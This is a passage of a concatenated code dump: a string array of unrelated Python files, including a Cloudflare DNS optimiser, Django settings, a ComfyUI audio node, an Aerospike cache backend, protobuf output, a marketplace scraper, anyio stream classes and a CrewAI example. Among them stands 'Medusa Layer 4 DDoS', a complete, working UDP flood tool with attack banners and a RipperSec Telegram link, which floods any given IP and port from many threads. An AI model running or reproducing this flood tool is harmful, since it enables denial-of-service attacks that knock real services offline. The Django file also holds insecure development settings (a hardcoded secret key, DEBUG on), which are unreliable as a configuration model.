ms`\\n\u6570\u636e\u4e2d\u5fc3\uff1a`{max_colo}`\\n\u6d4b\u901f\u670d\u52a1\u5668\uff1a`{max_device_name}`\\n\\n\u5f00\u59cb\u5c1d\u8bd5\u5207\u6362DNS\u89e3\u6790\u2026\u2026\"\n                send_message(text)\n\n                update_dns_ip(max_address)\n\n    except Exception as e:\n        notice = response['msg'] if response['msg'] else \"API\u51fa\u73b0\u95ee\u9898\uff0c\u8bf7\u68c0\u67e5\uff01\"\n        text = \"\u274c*\u672c\u6b21\u4f18\u9009IP\u83b7\u53d6\u5931\u8d25*\\n\\n\u6545\u969c\u539f\u56e0\uff1a\" + notice + str(e)\n        send_message(text)\n\n\n# def job():\n#     get_current_ip()\n#\n#\n# schedule.every(4).hours.do(job)\n#\n# while True:\n#     schedule.run_pending()\n#     time.sleep(1)\n\nif __name__ == '__main__':\n    get_current_ip()\n",
    "\"\"\"\nDjango settings for backend project.\n\nGenerated by 'django-admin startproject' using Django 5.0.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/5.0/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/5.0/ref/settings/\n\"\"\"\n\nfrom pathlib import Path\n\n# Build paths inside the project like this: BASE_DIR / 'subdir'.\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/5.0/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = \"django-insecure-!xk2!*@%f#%wl5$luf99)8fmc8@(*86lwp!wo_qacv)rska9&@\"\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = [\"10.0.2.2\", \"127.0.0.1\"]\nALLOW_ALL_ORIGINS = True\n\n# Application definition\n\nINSTALLED_APPS = [\n    \"django.contrib.admin\",\n    \"django.contrib.auth\",\n    \"django.contrib.contenttypes\",\n    \"django.contrib.sessions\",\n    \"django.contrib.messages\",\n    \"django.contrib.staticfiles\",\n    \"rest_framework\",\n    \"api\",\n]\n\nMIDDLEWARE = [\n    \"django.middleware.security.SecurityMiddleware\",\n    \"django.contrib.sessions.middleware.SessionMiddleware\",\n    \"django.middleware.common.CommonMiddleware\",\n    \"django.middleware.csrf.CsrfViewMiddleware\",\n    \"django.contrib.auth.middleware.AuthenticationMiddleware\",\n    \"django.contrib.messages.middleware.MessageMiddleware\",\n    \"django.middleware.clickjacking.XFrameOptionsMiddleware\",\n]\n\nROOT_URLCONF = \"backend.urls\"\n\nTEMPLATES = [\n    {\n        \"BACKEND\": \"django.template.backends.django.DjangoTemplates\",\n        \"DIRS\": [],\n        \"APP_DIRS\": True,\n        \"OPTIONS\": {\n            \"context_processors\": [\n                \"django.template.context_processors.debug\",\n                \"django.template.context_processors.request\",\n                \"django.contrib.auth.context_processors.auth\",\n                \"django.contrib.messages.context_processors.messages\",\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = \"backend.wsgi.application\"\n\n\n# Database\n# https://docs.djangoproject.com/en/5.0/ref/settings/#databases\n\nDATABASES = {\n    \"default\": {\n        \"ENGINE\": \"django.db.backends.sqlite3\",\n        \"NAME\": BASE_DIR / \"db.sqlite3\",\n    }\n}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/5.0/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.UserAttributeSimilarityValidator\",\n    },\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.MinimumLengthValidator\",\n    },\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.CommonPasswordValidator\",\n    },\n    {\n        \"NAME\": \"django.contrib.auth.password_validation.NumericPasswordValidator\",\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/5.0/topics/i18n/\n\nLANGUAGE_CODE = \"en-us\"\n\nTIME_ZONE = \"UTC\"\n\nUSE_I18N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/5.0/howto/static-files/\n\nSTATIC_URL = \"static/\"\n\n# Default primary key field type\n# https://docs.djangoproject.com/en/5.0/ref/settings/#default-auto-field\n\nDEFAULT_AUTO_FIELD = \"django.db.models.BigAutoField\"\n",
    "import os\n\nimport folder_paths\n\nfrom .util import get_wav_bytes_from_file, audio_extensions\n\n\nclass LoadAudioNode:\n    @classmethod\n    def INPUT_TYPES(cls):\n        input_dir = folder_paths.get_input_directory()\n        files = os.listdir(input_dir)\n        files = filter(lambda f: os.path.isfile(os.path.join(input_dir, f)), files)\n        files = filter(lambda f: os.path.splitext(f)[1].lstrip('.') in audio_extensions, files)\n        return {\n            \"required\": {\n                \"audio\": (sorted(files),),\n            },\n        }\n\n    CATEGORY = \"audio\"\n\n    RETURN_TYPES = (\"WAV_BYTES\", )\n    RETURN_NAMES = (\"wav_bytes\", )\n\n    FUNCTION = \"load_audio\"\n\n    def load_audio(self, audio):\n        input_directory = folder_paths.get_input_directory()\n        filepath = os.path.join(input_directory, audio)\n        audio = get_wav_bytes_from_file(filepath)\n        return (audio, )\n\n    # @classmethod\n    # def IS_CHANGED(cls, video, **kwargs):\n    #     image_path = folder_paths.get_annotated_filepath(video)\n    #     return calculate_file_hash(image_path)\n\n    @classmethod\n    def VALIDATE_INPUTS(cls, audio, **kwargs):\n        if not folder_paths.exists_annotated_filepath(audio):\n            return \"Invalid video file: {}\".format(audio)\n        return True\n",
    "import socket\nimport sys, os\nimport threading\nimport time\nimport random\n\nif len(sys.argv) < 5:\n  print(\"\"\"\\033[0m\n\n\n\n\\033[0m           \u2588\u2580\u2584\u2580\u2588 \u2588\u2580\u2580 \u2588\u2580\u2580\u2584 \u2588\u2500\u2500\u2588 \u2588\u2580\u2580 \u2588\u2580\u2580\u2588 \\033[31m \u2588\u2580\u2580\u2584 \u2588\u2580\u2580\u2584 \u2588\u2580\u2580\u2588 \u2588\u2580\u2580 \n\\033[0m           \u2588\u2500\u2580\u2500\u2588 \u2588\u2580\u2580 \u2588\u2500\u2500\u2588 \u2588\u2500\u2500\u2588 \u2580\u2580\u2588 \u2588\u2584\u2584\u2588 \\033[31m \u2588\u2500\u2500\u2588 \u2588\u2500\u2500\u2588 \u2588\u2500\u2500\u2588 \u2580\u2580\u2588 \n\\033[0m           \u2580\u2500\u2500\u2500\u2580 \u2580\u2580\u2580 \u2580\u2580\u2580\u2500 \u2500\u2580\u2580\u2580 \u2580\u2580\u2580 \u2580\u2500\u2500\u2580 \\033[31m \u2580\u2580\u2580\u2500 \u2580\u2580\u2580\u2500 \u2580\u2580\u2580\u2580 \u2580\u2580\u2580     \n\\033[33m       \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2566\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\\033[33m       \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2569\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\\033[33m       \u2551            Welcome To \\033[31mMedusa Layer 4 DDoS            \\033[33m\u2551\n\\033[33m       \u2551      \\x1b[38;2;255;20;147m\u25ba\u25ba \\033[0mThis tool for Layer 4 Attack \\033[31m(\\033[0mUDP \\033[31m& \\033[0mTCP\\033[31m)     \\033[33m\u2551\n\\033[33m       \u2551           Telegram \\x1b[38;2;255;20;147m: \\033[32mhttps://t.me/RipperSec          \\033[33m\u2551\n\\033[33m       \u2551                 Developer \\x1b[38;2;255;20;147m: \\033[0mTrashDono                \\033[33m\u2551\n\\033[33m       \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\\033[0m\"\"\")\n  sys.exit(\"\\x1b[38;2;255;20;147m\u25ba\u25ba \\033[0mUsage\\x1b[38;2;255;20;147m: \\033[0mpython3 \\033[33mMedusaL4 \\033[0m<\\033[32mtimes\\033[0m> <\\033[32mip\\033[0m> <\\033[32mport\\033[0m> <\\033[32mpacket\\033[0m> <\\033[32mthreads\\033[0m>\")\n\nprint(\"\\x1b[31m[\\x1b[33mMedusa\\x1b[31m] \\x1b[0mAttack Started!\")\nip = str(sys.argv[1])\nport = int(sys.argv[2])\npacket = int(sys.argv[3])\nthreads = int(sys.argv[4])\ntimes = float(sys.argv[5])\n\ntimeout = time.time() + 1 * times\n\ndef udp(ip, port, packet, times):\n  timeout = time.time() + 1 * times\n  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)\n  print(f\"\\x1b[31m[\\x1b[33mMedusa\\x1b[31m] \\x1b[0mAttacking... \\x1b[31m>  \\x1b[0mtime \\x1b[32m{times} \\x1b[0mip \\x1b[32m{ip}\\x1b[31m:\\x1b[32m{port}\\x1b[0m packet \\x1b[32m{packet}\\x1b[0m threads \\x1b[32m{threads}\\x1b[0m \")\n  while time.time() < timeout:\n    try:\n      try:\n        data = random._urandom(int(random.randint(1025, 65505)))\n        for _ in range(packet):\n          s.sendto(data, (str(ip), int(port)))\n      except:\n        s.close()\n    except:\n      s.close()\n  print(\"\\x1b[31m[\\x1b[33mMedusa\\x1b[31m] > \\x1b[0mSuccessfully Attack!\")\n\ndef main():\n  global threads\n  for _ in range(threads):\n    thread = []\n    th = threading.Thread(target=udp, args=(ip, port, packet, times))\n    thread.append(th)\n    th.start()\n\nif __name__ == '__main__':\n  try:\n    main()\n  except KeyboardInterrupt:\n    print('\\x1b[31m[\\x1b[33mMedusa\\x1b[31m] \\x1b[0mAttack Over!')\n    sys.exit()\n",
    "\"\"\"\n    aerospike_flask.cache.aerospike\n    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n    Aerospike cache backend for Flask-Caching.\n\n    :copyright: (c) 2024 by Micah Carrick.\n    :license: BSD, see LICENSE for more details.\n\"\"\"\n# pylint: disable=no-member\n\nimport logging\nimport atexit\n\nfrom flask_caching.backends.base import BaseCache\n\nlogger = logging.getLogger('aerospike_flask_cache')\n\n\nclass AerospikeCache(BaseCache):\n    \"\"\"Cache backend using Aerospike Database as a distributed cache\n\n    :param client: instantiated aerospike.client instance\n    :param namespace: Aerospike namespace name\n    :param set_name: Aerospike set name or the \"null set\" if ``None``\n    :param default_timeout: default timeout (TTL) in seconds\n    \"\"\"\n\n    def __init__(self, client, namespace, set_name=None, default_timeout=300):\n        BaseCache.__init__(self, default_timeout=default_timeout)\n        client.connect()\n        self._client = client\n        self._namespace = namespace\n        self._set = set_name\n        self._bin_name = \"v\"\n        self.default_timeout = default_timeout\n\n        atexit.register(self.close_client)\n\n    @classmethod\n    def factory(cls, app, config, args, kwargs):\n        # pylint: disable=import-outside-toplevel\n        try:\n            import aerospike\n            import aerospike_helpers.batch.records as aerospike_batch\n            import aerospike_helpers.operations.operations as aerospike_ops\n            cls._aerospike = aerospike\n            cls._aerospike_batch = aerospike_batch\n            cls._aerospike_ops = aerospike_ops\n            logger.debug(\"Aerospike client version %s\", aerospike.__version__)\n        except ImportError as err:  # pragma: no cover\n            raise RuntimeError(\"aerospike module not found\") from err\n\n        if 'CACHE_AEROSPIKE_NAMESPACE' not in config:\n            msg = \"CACHE_AEROSPIKE_NAMESPACE is required\"\n            raise RuntimeError(msg)\n\n        kwargs['namespace'] = config.get(\"CACHE_AEROSPIKE_NAMESPACE\", \"cache\")\n        kwargs['set_name'] = config.get(\"CACHE_AEROSPIKE_SET\", None)\n\n        if len(kwargs['namespace'].encode('utf-8')) > 31:\n            msg = \"CACHE_AEROSPIKE_NAMESPACE must be less than 32 characters\"\n            raise RuntimeError(msg)\n\n        if kwargs['set_name'] and len(kwargs['set_name'].encode('utf-8')) > 63:\n            msg = \"CACHE_AEROSPIKE_SET must be less than 64 characters\"\n            raise RuntimeError(msg)\n\n        # instantiated client takes precedence over hosts array\n        if \"CACHE_AEROSPIKE_CLIENT\" in config:\n            kwargs[\"client\"] = config.get(\"CACHE_AEROSPIKE_CLIENT\", None)\n        elif \"CACHE_AEROSPIKE_HOSTS\" in config:\n            asconf = {\n                'hosts': config.get(\"CACHE_AEROSPIKE_HOSTS\")\n            }\n            kwargs[\"client\"] = aerospike.client(asconf)\n            logger.debug(\"Initialized client: %s\", kwargs[\"client\"])\n        else:\n            raise RuntimeError(\"must specify client or host\")\n\n        return cls(*args, **kwargs)\n\n    def __del__(self):\n        \"\"\" Close client connections when garbage collected.\n        \"\"\"\n        self.close_client()\n\n    def add(self, key, value, timeout=None):\n        \"\"\"Works like :meth:`set` but does not overwrite the values of already\n        existing keys.\n\n        :param key: the key to set\n        :param value: the value for the key\n        :param timeout: the cache timeout for the key in seconds (if not\n                        specified, it uses the default timeout). A timeout of\n                        0 indicates that the cache never expires.\n        :returns: Same as :meth:`set`, but also ``False`` for already\n                  existing keys.\n        :rtype: boolean\n        \"\"\"\n        return self._put(key, value, timeout, False)\n\n    def clear(self):\n        \"\"\"Clears the cache using the Aerospike 'truncate' info command.\n\n        :returns: Whether the cache has been cleared.\n        :rtype: boolean\n        \"\"\"\n        logger.debug(\"Truncating %s.%s\", self._namespace, self._set)\n        # Note: truncate is async\n        if self._client.truncate(self._namespace, self._set, 0) != 0:\n            return False  # pragma: no cover\n\n        return True\n\n    def close_client(self):\n        \"\"\"Close client connections if the client is instantiated and\n        connected. Called by `atexit` and/or when garbage collected.\n\n        :returns: Returns ``True`` if the client connections were closed and\n                 ``False`` if the client was not instantiated or was not\n                 connected.\n        :rtype: boolean\n        \"\"\"\n        if self.is_connected():\n            logger.debug(\"closing Aerospike client: %s\", self._client)\n            self._client.close()\n            self._client = None\n            return True\n\n        return False\n\n    def dec(self, key: str, delta=1):\n        \"\"\"Decrements the value of a key by `delta`.  If the key does\n        not yet exist it is initialized with `-delta`.\n\n        For supporting caches this is an atomic operation",
    "# -*- coding: utf-8 -*-\n# Generated by the protocol buffer compiler.  DO NOT EDIT!\n# source: policy_common_definitions.proto\n\"\"\"Generated protocol buffer code.\"\"\"\nfrom google.protobuf.internal import builder as _builder\nfrom google.protobuf import descriptor as _descriptor\nfrom google.protobuf import descriptor_pool as _descriptor_pool\nfrom google.protobuf import symbol_database as _symbol_database\n# @@protoc_insertion_point(imports)\n\n_sym_db = _symbol_database.Default()\n\n\n\n\nDESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\\n\\x1fpolicy_common_definitions.proto\\x12\\x15\\x65nterprise_management\\\"\\x1d\\n\\nStringList\\x12\\x0f\\n\\x07\\x65ntries\\x18\\x01 \\x03(\\t\\\"\\x92\\x01\\n\\rPolicyOptions\\x12H\\n\\x04mode\\x18\\x01 \\x01(\\x0e\\x32/.enterprise_management.PolicyOptions.PolicyMode:\\tMANDATORY\\\"7\\n\\nPolicyMode\\x12\\r\\n\\tMANDATORY\\x10\\x00\\x12\\x0f\\n\\x0bRECOMMENDED\\x10\\x01\\x12\\t\\n\\x05UNSET\\x10\\x02\\\"a\\n\\x12\\x42ooleanPolicyProto\\x12<\\n\\x0epolicy_options\\x18\\x01 \\x01(\\x0b\\x32$.enterprise_management.PolicyOptions\\x12\\r\\n\\x05value\\x18\\x02 \\x01(\\x08\\\"a\\n\\x12IntegerPolicyProto\\x12<\\n\\x0epolicy_options\\x18\\x01 \\x01(\\x0b\\x32$.enterprise_management.PolicyOptions\\x12\\r\\n\\x05value\\x18\\x02 \\x01(\\x03\\\"`\\n\\x11StringPolicyProto\\x12<\\n\\x0epolicy_options\\x18\\x01 \\x01(\\x0b\\x32$.enterprise_management.PolicyOptions\\x12\\r\\n\\x05value\\x18\\x02 \\x01(\\t\\\"\\x87\\x01\\n\\x15StringListPolicyProto\\x12<\\n\\x0epolicy_options\\x18\\x01 \\x01(\\x0b\\x32$.enterprise_management.PolicyOptions\\x12\\x30\\n\\x05value\\x18\\x02 \\x01(\\x0b\\x32!.enterprise_management.StringListB/H\\x03Z+chromium/policy/enterprise_management_proto')\n\n_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, globals())\n_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'policy_common_definitions_pb2', globals())\nif _descriptor._USE_C_DESCRIPTORS == False:\n\n  DESCRIPTOR._options = None\n  DESCRIPTOR._serialized_options = b'H\\003Z+chromium/policy/enterprise_management_proto'\n  _STRINGLIST._serialized_start=58\n  _STRINGLIST._serialized_end=87\n  _POLICYOPTIONS._serialized_start=90\n  _POLICYOPTIONS._serialized_end=236\n  _POLICYOPTIONS_POLICYMODE._serialized_start=181\n  _POLICYOPTIONS_POLICYMODE._serialized_end=236\n  _BOOLEANPOLICYPROTO._serialized_start=238\n  _BOOLEANPOLICYPROTO._serialized_end=335\n  _INTEGERPOLICYPROTO._serialized_start=337\n  _INTEGERPOLICYPROTO._serialized_end=434\n  _STRINGPOLICYPROTO._serialized_start=436\n  _STRINGPOLICYPROTO._serialized_end=532\n  _STRINGLISTPOLICYPROTO._serialized_start=535\n  _STRINGLISTPOLICYPROTO._serialized_end=670\n# @@protoc_insertion_point(module_scope)\n",
    "import json\r\nfrom urllib import parse\r\nimport pandas as pd\r\nfrom bs4 import BeautifulSoup\r\nfrom selenium import webdriver\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium.webdriver.support.wait import WebDriverWait\r\nfrom selenium.webdriver.support import expected_conditions as ec\r\nfrom selenium.webdriver.chrome.service import Service\r\nfrom webdriver_manager.chrome import ChromeDriverManager\r\n\r\n\r\nBASEURL = 'https://megamarket.ru'\r\n\r\n\r\ndef get_pages_html(url):\r\n    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))\r\n    driver.maximize_window()\r\n    ITEMS = []\r\n    try:\r\n        for page in range(1, 100):\r\n            print(f\"[+] \u0421\u0442\u0440\u0430\u043d\u0438\u0446\u0430 {page}\")\r\n            driver.get(url=url.replace(f'page_num', f'page-{page}'))\r\n            WebDriverWait(driver, 60).until(\r\n                ec.presence_of_element_located((By.TAG_NAME, \"html\")))\r\n            if not get_items(driver.page_source, ITEMS):\r\n                break\r\n    except Exception as ex:\r\n        print(ex)\r\n    finally:\r\n        driver.close()\r\n        driver.quit()\r\n    return ITEMS\r\n\r\n\r\ndef get_items(html, items):\r\n    soup = BeautifulSoup(html, 'html.parser')\r\n    items_divs = soup.find_all('div', class_='catalog-item')\r\n    if len(items_divs) == 0:\r\n        return False\r\n    for item in items_divs:\r\n        link = BASEURL + item.find('a', class_='ddl_product_link').get('href')\r\n        item_price = item.find('div', class_='item-price')\r\n        if item_price:\r\n            item_price_result = item_price.find('span').get_text()\r\n            item_bonus = item.find('div', class_='item-bonus')\r\n            if item_bonus:\r\n                item_bonus_percent = item.find('span', class_='bonus-percent').get_text()\r\n                item_bonus_amount = item.find('span', class_='bonus-amount').get_text()\r\n                item_title = item.find('div', class_='item-title').get_text()\r\n                item_merchant_name = item.find('span', class_='merchant-info__name')\r\n                if item_merchant_name:\r\n                    item_merchant_name = item_merchant_name.get_text()\r\n                else:\r\n                    item_merchant_name = '-'\r\n\r\n                bonus = int(item_bonus_amount.replace(' ', ''))\r\n                price = int(item_price_result[0:-1].replace(' ', ''))\r\n                bonus_percent = int(item_bonus_percent.replace('%', ''))\r\n                items.append({\r\n                    '\u041d\u0430\u0438\u043c\u0435\u043d\u043e\u0432\u0430\u043d\u0438\u0435': item_title,\r\n                    '\u041f\u0440\u043e\u0434\u0430\u0432\u0435\u0446': item_merchant_name,\r\n                    '\u0426\u0435\u043d\u0430': price,\r\n                    '\u0421\u0443\u043c\u043c\u0430 \u0431\u043e\u043d\u0443\u0441\u0430': bonus,\r\n                    '\u041f\u0440\u043e\u0446\u0435\u043d\u0442 \u0431\u043e\u043d\u0443\u0441\u0430': bonus_percent,\r\n                    '\u0421\u0441\u044b\u043b\u043a\u0430 \u043d\u0430 \u0442\u043e\u0432\u0430\u0440': link\r\n                })\r\n    return True\r\n\r\n\r\ndef save_excel(data: list, filename: str):\r\n    \"\"\"\u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u0430 \u0432 excel \u0444\u0430\u0439\u043b\"\"\"\r\n    df = pd.DataFrame(data)\r\n    writer = pd.ExcelWriter(f'{filename}.xlsx')\r\n    df.to_excel(writer, sheet_name='data', index=False)\r\n    # \u0443\u043a\u0430\u0437\u044b\u0432\u0430\u0435\u043c \u0440\u0430\u0437\u043c\u0435\u0440\u044b \u043a\u0430\u0436\u0434\u043e\u0433\u043e \u0441\u0442\u043e\u043b\u0431\u0446\u0430 \u0432 \u0438\u0442\u043e\u0433\u043e\u0432\u043e\u043c \u0444\u0430\u0439\u043b\u0435\r\n    writer.sheets['data'].set_column(0, 1, width=50)\r\n    writer.sheets['data'].set_column(1, 2, width=30)\r\n    writer.sheets['data'].set_column(2, 3, width=8)\r\n    writer.sheets['data'].set_column(3, 4, width=20)\r\n    writer.sheets['data'].set_column(4, 5, width=15)\r\n    writer.close()\r\n    print(f'\u0412\u0441\u0435 \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u043e \u0432 {filename}.xlsx')\r\n\r\n\r\ndef main():\r\n    target = input('\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0442\u043e\u0432\u0430\u0440\u0430: ')\r\n    min_price = input('\u041c\u0438\u043d\u0438\u043c\u0430\u043b\u044c\u043d\u0430\u044f \u0446\u0435\u043d\u0430 (enter, \u0447\u0442\u043e\u0431\u044b \u043f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u044c): ')\r\n    min_price = min_price if min_price != '' else '0'\r\n    max_price = input('\u041c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u0430\u044f \u0446\u0435\u043d\u0430 (enter, \u0447\u0442\u043e\u0431\u044b \u043f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u044c): ')\r\n    max_price = max_price if max_price != '' else '9999999'\r\n    target_url = f\"{BASEURL}/catalog/page_num/?q={target}\"\r\n    if max_price and min_price and (max_price.isdigit() and min_price.isdigit()):\r\n        filter = {\r\n            \"88C83F68482F447C9F4E401955196697\": {\"min\": int(min_price), \"max\": int(max_price)},# \u0444\u0438\u043b\u044c\u0442\u0440 \u043f\u043e \u0446\u0435\u043d\u0435\r\n            \"4CB2C27EAAFC4EB39378C4B7487E6C9E\": [\"1\"]}# \u0444\u0438\u043b\u044c\u0442\u0440 \u043f\u043e \u043d\u0430\u043b\u0438\u0447\u0438\u044e \u0442\u043e\u0432\u0430\u0440\u0430\r\n        json_data = json.dumps(filter)\r\n        # \u041a\u043e\u0434\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 JSON \u0441\u0442\u0440\u043e\u043a\u0438 \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0438 \u0447\u0435\u0440\u0435\u0437 URL\r\n        url_encoded_data = parse.quote(json_data)\r\n        target_url += '#?filters=' + url_encoded_data\r\n\r\n    items = get_pages_html(url=target_url)\r\n    save_excel(items, target)\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()\r\n",
    "from __future__ import annotations\n\nimport sys\nfrom abc import ABCMeta, abstractmethod\nfrom socket import AF_INET, SOCK_STREAM, AddressFamily, SocketKind\nfrom typing import TYPE_CHECKING, Generic, TypeVar\n\nif sys.version_info >= (3, 12):\n    from typing import Buffer\nelse:\n    from typing_extensions import Buffer\n\nif TYPE_CHECKING:\n    from .socket import SocketType\n\nT = TypeVar(\"T\")\nT_resource = TypeVar(\"T_resource\")\nSendType = TypeVar(\"SendType\")\nReceiveType = TypeVar(\"ReceiveType\")\n\n\nclass AsyncResource(metaclass=ABCMeta):\n    @abstractmethod\n    async def aclose(self) -> None: ...\n\n\nclass SendStream(AsyncResource):\n    @abstractmethod\n    async def send_all(self, data: Buffer) -> None: ...\n\n    @abstractmethod\n    async def wait_send_all_might_not_block(self) -> None: ...\n\n\nclass ReceiveStream(AsyncResource):\n    @abstractmethod\n    async def receive_some(self, max_bytes: int | None = None) -> bytes | bytearray: ...\n\n\nclass Stream(SendStream, ReceiveStream):\n    pass\n\n\nclass HalfCloseableStream(Stream):\n    @abstractmethod\n    async def send_eof(self) -> None: ...\n\n\nclass Listener(AsyncResource, Generic[T_resource]):\n    @abstractmethod\n    async def accept(self) -> T_resource: ...\n\n\nclass SendChannel(AsyncResource, Generic[SendType]):\n    async def send(self, value: SendType) -> None:\n        pass\n\n\nclass ReceiveChannel(AsyncResource, Generic[ReceiveType]):\n    async def receive(self) -> ReceiveType:\n        pass\n\n\nclass Channel(SendChannel[T], ReceiveChannel[T]):\n    pass\n\n\nclass HostnameResolver(metaclass=ABCMeta):\n    @abstractmethod\n    async def getaddrinfo(\n        self,\n        host: bytes | None,\n        port: bytes | str | int | None,\n        family: int = 0,\n        type: int = 0,\n        proto: int = 0,\n        flags: int = 0,\n    ) -> list[\n        tuple[\n            AddressFamily,\n            SocketKind,\n            int,\n            str,\n            tuple[str, int] | tuple[str, int, int, int],\n        ]\n    ]: ...\n\n\nclass SocketFactory(metaclass=ABCMeta):\n    @abstractmethod\n    def socket(\n        self,\n        family: AddressFamily = AF_INET,\n        type: SocketKind = SOCK_STREAM,\n        proto: int = 0,\n    ) -> SocketType: ...\n",
    "'''\nName\n    main.py\n\nAuthor\n    Written by Rip&Tear - CrewAI Discord Moderator .riptear\n    \nDate Sat 13th Apr 2024\n    \nDescription\n    This is a basic example of how to use the CrewAI library to create a simple research task. \n    The task is to research the topic of \"70s and 80s British rock bands\" and provide 5 paragraphs of information on the topic. \n    The task is assigned to a single agent (Researcher) who will use the ChatOllama model to generate the information. \n    The result of the task is written to a file called \"research_result.txt\".\n\nUsage\n    python main.py\n    \nOutput\n    The output of the task is written to a file called \"research_result.txt\".'''\n\n# Import required libraries - make sure the crewai and langchain_community packages are installed via pip\nimport os\nfrom crewai import Agent\nfrom crewai import Task\nfrom crewai import Crew, Process\n\nos.environ['OPENAI_API_BASE']='http://localhost:11434/v1'\nos.environ['OPENAI_API_KEY']='sk-111111111111111111111111111111111111111111111111'\nos.environ['OPENAI_MODEL_NAME']='mistral:7b-instruct-q4_0'\n\n# Create a function to log to a file with the date as the filename - this will be used as a callback function for the agent. this could be as complex as you like\ndef write_result_to_file(result):\n    filename = 'raw_output.log'\n    with open(filename, 'a') as file:\n        file.write(str(result))\n\n# Create the agent\nresearcher = Agent(\n    role='Researcher', # Think of this as the job title\n    goal='Research the topic', # This is the goal that the agent is trying to achieve\n    backstory='As an expert in the field of {topic}, you will research the topic and provide the necessary information', # This is the backstory of the agent, this helps the agent to understand the context of the task\n    max_iter=3, # This is the maximum number of iterations that the agent will use to generate the output\n    max_rpm=100, # This is the maximum number of requests per minute that the agent can make to the language model\n    verbose=True, # This is a flag that determines if the agent will print more output to the console \n    step_callback=write_result_to_file, # This is a callback function that will be called after each iteration of the agent\n    Allow_Delegation=False, # This is a flag that determines if the agent can delegate the task to another agent. As we are only using one agent, we set this to False\n    cache=False, # Indicates if the agent should use a cache for tool usage. A tool is not used in this example, so we set this to False\n)  \n\n# Create the task\nresearch_task = Task(\n    description='Research the topic', # This is a description of the task\n    agent=researcher, # This is the agent that will be assigned the task\n    expected_output='5 paragpahs of information on the topic', # This is the expected output of the taskafter its completion\n    verbose=True, # This is a flag that determines if the task will print more output to the console\n    output_file='research_result.txt' # This is the file where the output of the task will be written to, in this case, it is \"research_result.txt\"\n)           \n\n# Create the crew  \ncrew = Crew(\n  agents=[researcher], # This is a list of agents that will be part of the crew\n  tasks=[research_task], # This is a list of tasks that the crew will be assigned\n  process=Process.sequential, # This is the process that the crew will use to complete the tasks, in this case, we are using a sequential process\n  verbose=True, # This is a flag that determines if the crew will print more output to the console\n  memory=False, # This is a flag that determines if the crew will use memory to store information about the tasks in a vector database\n  cache=False, # This is a flag that determines if the crew will use a cache. A cache is not needed in this example, so we set this to False\n  max_rpm=100, # This is the maximum number of requests per minute that the crew can make to the language model \n)\n\n# Starting start the crew\nresult = crew.kickoff(inputs={'topic': '70s, 80s and 90s Australian rock bands'}) # Change the topic to whatever you want to research\nprint(result)\n",
